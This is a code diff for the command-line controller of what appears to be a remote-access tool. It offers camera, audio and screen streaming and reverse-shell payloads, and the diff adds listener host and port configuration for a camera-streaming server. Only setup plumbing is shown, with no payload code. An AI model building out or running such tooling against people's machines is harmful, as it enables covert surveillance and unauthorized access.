@@ -18,13 +18,19 @@ from server.name import SERVER_TYPES
 from payloads.name import PAYLOADS_TYPES
 from assets.colors import colors
 from assets.symbols import Sminess, Splus, Swarning, Ssowrd
-from payloads.name import PAYLOADS_TYPES
 from errors.WarningHandler import * #error handler you will find the script in warnings\WarningHandler.py directory
 import json
+from configparser import ConfigParser
 import socket
 from payloads.makers.CameraStreamingPayloadMaker import * #this just the CameraStreaming payload maker and wee are import the class that makes the paylaod
+from server.types.CameraStreaming import CAMERA_STREAMING_PORT, CONFIG_FILE, run as CameraStreamingStart
+#setting colors
 CR = colors #colors class from assets/colors.py
 
+#configs editing
+CONFIG_PARSER = ConfigParser()
+
+#command line args
 PARSER = argparse.ArgumentParser()
 PARSER.add_argument("-s", "--show", help="take an argument [servers, payloads]")
 PARSER.add_argument("-u", "--use" , help="command to start a server [take an argument]")
@@ -62,7 +68,7 @@ if __SHOW__:
     elif __SHOW__ == "payloads" :
         print(F"\r {Splus} {CR.green()}Payloads:")
         for x in PAYLOADS_TYPES:
-            print(" "*5 +f"{Ssowrd}{CR.blue()}{x}{CR.white()}")
+            print(" "*5 + f"{Ssowrd}{CR.blue()}{x}{CR.white()}")
     else:
         InvaliedEntry(
             element = "show"
@@ -90,10 +96,41 @@ if __SET__:
         P_LPORT_SOCKET = CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] else __SocketLport__ if __SocketLport__ else NoLportSpec()
         if __SET__ == PAYLOADS_TYPES[0]: #CameraStreaming
             __CameraStreamingPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["CameraStreamingPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["CameraStreamingPort"] else __CameraStreamingPort__ if __CameraStreamingPort__ else NoCameraStreamingPortSpec()
-        
         elif __SET__ == PAYLOADS_TYPES[1]:  #AudioStreaming
             __AudioStreamingPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["AudioStreamingPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["AudioStreamingPort"] else __AudioStreamingPort__ if __AudioStreamingPort__ else NoAudioStreamingPortSpec()
         elif __SET__ == PAYLOADS_TYPES[2]: #ScreenStreaming
             __ScreenStreamingPort__ = CONFIG_LOAD["PayloadCondig"]["lport"]["ScreenStreamingPort"] if CONFIG_LOAD["PayloadCondig"]["lport"]["ScreenStreamingPort"] else __ScreenStreamingPort__ if __ScreenStreamingPort__ else NoScreenStreamingPortSpec()
         elif __SET__ == PAYLOADS_TYPES[3]: #ReverseShell
             __ReverseShellPort__ = CONFIG_LOAD["PayloadConfig"]["lport"]["ReverseShellPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["ReverseShellPort"] else __ReverseShellPort__ if __ReverseShellPort__ else NoReverShellPort()
+
+elif __USE__:
+    """
+    starting the server that 
+    the user has chossed
+    """
+    with open("config.json", "r") as JSON_CONF:
+        CONFIG_LOAD = json.load(JSON_CONF)
+        if CONFIG_LOAD["ServerConfig"]["lhost"]:
+            LHOST = socket.gethostbyname(socket.gethostname()) if CONFIG_LOAD["ServerConfig"]["lhost"] == "auto" else CONFIG_LOAD["ServerConfig"]["lhost"]
+        else:
+            pass
+        if __SocketLhost__:
+            LHOST = __SocketLhost__
+        else:
+            pass
+        if LHOST:
+            pass
+        else:
+            NoLhostSpec()
+        P_LPORT_SOCKET = CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] if CONFIG_LOAD["PayloadConfig"]["lport"]["SocketPort"] else __SocketLport__ if __SocketLport__ else NoLportSpec()
+    if __USE__ == SERVER_TYPES[0]:
+        __CameraStreamingPort__ = CONFIG_LOAD["ServerConfig"]["lport"]["CameraStreamingPort"] if CONFIG_LOAD["ServerConfig"]["lport"]["CameraStreamingPort"] else __CameraStreamingPort__ if __CameraStreamingPort__ else NoCameraStreamingPortSpec()
+        CONFIG_FILE = "server/setting/CS-config.ini"
+        CONFIG_PARSER.read(CONFIG_FILE)
+        CONFIG_PARSER.add_section("CameraStreaming")
+        CONFIG_PARSER.set("CameraStreaming", "lhost", f"{LHOST}")
+        CONFIG_PARSER.set("CameraStreaming", "SocketPort", f"{P_LPORT_SOCKET}")
+        CONFIG_PARSER.set("CameraStreaming", "CameraStreamingPort", f"{CAMERA_STREAMING_PORT}")
+        with open(CONFIG_FILE, "w") as CONFIG_DES:
+            CONFIG_PARSER.write(CONFIG_DES)
+        #CameraStreamingStart() C:\Users\mohamed said yemlah\OneDrive\Desktop\ramsy\server\setting\CS-config.ini
